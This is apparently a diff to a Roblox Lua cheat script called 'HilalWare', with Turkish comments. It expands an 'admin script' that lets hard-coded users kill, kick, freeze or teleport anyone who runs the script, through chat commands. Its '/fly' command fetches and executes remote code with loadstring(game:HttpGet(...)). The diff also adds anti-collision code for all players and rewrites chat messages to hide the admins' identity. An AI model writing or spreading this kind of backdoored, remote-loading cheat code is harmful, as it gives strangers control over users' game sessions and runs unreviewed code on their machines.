@@ -26,11 +26,12 @@ Sizi sitemize ve Tiktok a bekleriz.
 Ve kullandığınız için teşekkür ederiz.
 
 ]] 
-
-
+--v5
+--admin script
 local Players = game:GetService("Players")
 local StarterGui = game:GetService("StarterGui")
 local TextChatService = game:GetService("TextChatService")
+local RunService = game:GetService("RunService")
 
 local message = "By HilalWare.Lua"
 
@@ -48,10 +49,8 @@ else
     end)
 end
 
-
 -- Admin kodu
 local LocalPlayer = Players.LocalPlayer
-local RunService = game:GetService("RunService")
 
 -- Yetkililer
 local allowedUsers = {
@@ -123,49 +122,80 @@ end)
 -- Komutlar
 local function setupCommands(player)
     player.Chatted:Connect(function(message)
-        message = string.lower(message)
+        local msg = string.lower(message):gsub("%s+", "") -- mesajı küçük harfe çevir ve tüm boşlukları kaldır
 
-        if message == "/kill" then
+        if msg == "/kill" then
             if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                 LocalPlayer.Character.Humanoid.Health = 0
             end
 
-        elseif message == "/kick" then
+        elseif msg == "/kick" then
             LocalPlayer:Kick("Yetkili tarafından oyundan atıldınız.")
 
-        elseif message == "/freeze" then
+        elseif msg == "/freeze" then
             if LocalPlayer.Character then
                 frozen = true
                 setAnchoredAllParts(LocalPlayer.Character, true)
             end
 
-        elseif message == "/unfreeze" then
+        elseif msg == "/unfreeze" then
             if LocalPlayer.Character then
                 frozen = false
                 setAnchoredAllParts(LocalPlayer.Character, false)
             end
 
-        elseif message == "/bring" then
+        elseif msg == "/bring" then
             if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                 LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
             end
 
-        elseif message == "/loopbring" then
+        elseif msg == "/loopbring" then
             loopBring = true
             loopTarget = player
-        
 
-        elseif message == "/unloopbring" then
+        elseif msg == "/unloopbring" then
             loopBring = false
             loopTarget = nil
-        
 
-        elseif message == "/fly" then
+        elseif msg == "/fly" then
             loadstring(game:HttpGet("https://raw.githubusercontent.com/HilalWare-Official/HilalWare/refs/heads/main/fly"))()
+
+        elseif msg == "/antifling" then
+            local function makeNoCollide(character)
+                for _, part in ipairs(character:GetDescendants()) do
+                    if part:IsA("BasePart") then
+                        part.CanCollide = false
+                    end
+                end
+            end
+
+            local function onPlayerAdded(player)
+                player.CharacterAdded:Connect(function(character)
+                    makeNoCollide(character)
+                end)
+            end
+
+            for _, p in ipairs(Players:GetPlayers()) do
+                onPlayerAdded(p)
+                if p.Character then
+                    makeNoCollide(p.Character)
+                end
+            end
+
+            Players.PlayerAdded:Connect(onPlayerAdded)
+
+            RunService.Heartbeat:Connect(function()
+                for _, p in ipairs(Players:GetPlayers()) do
+                    if p.Character then
+                        makeNoCollide(p.Character)
+                    end
+                end
+            end)
         end
     end)
 end
 
+-- PlayerAdded eventleri ve başlangıç işlemleri
 Players.PlayerAdded:Connect(function(player)
     if allowedUsers[player.Name] then
         addAdminTag(player)
@@ -179,3 +209,21 @@ for _, player in ipairs(Players:GetPlayers()) do
         setupCommands(player)
     end
 end
+
+-- Chat mesajlarını filtrele (Hilalci yazan adminler "Ben" olarak görünür)
+if TextChatService:FindFirstChild("TextChannels") then
+    local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+    if channel then
+        channel.OnIncomingMessage = function(message)
+            local senderName = message.TextSource and message.TextSource.Name
+            local sender = senderName and Players:FindFirstChild(senderName)
+            if sender and allowedUsers[sender.Name] then
+                if string.find(string.lower(message.Text), "hilalci") then
+                    message.Text = "Ben"
+                end
+            end
+            return message
+        end
+    end
+end
+
